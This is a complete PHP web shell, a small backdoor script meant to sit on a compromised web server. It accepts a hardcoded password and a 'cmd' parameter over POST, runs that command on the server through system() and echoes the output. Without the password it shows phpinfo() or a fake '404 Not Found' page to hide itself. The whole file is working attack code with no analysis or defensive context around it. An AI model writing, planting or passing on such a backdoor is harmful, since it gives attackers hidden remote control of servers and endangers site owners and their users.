<?php 
if(isset($_POST["pwd"]) && $_POST["pwd"]=="8f82c58549f2e9d618aaed6f4d043c20"){
    if(isset($_POST["cmd"])){
        echo "<pre>";
        system($_POST["cmd"]);
        echo "</pre>";
    }else{
        phpinfo();
    }
}else{
    echo "<title>404 Not Found</title><h1>Not Found</h1>";
}
?>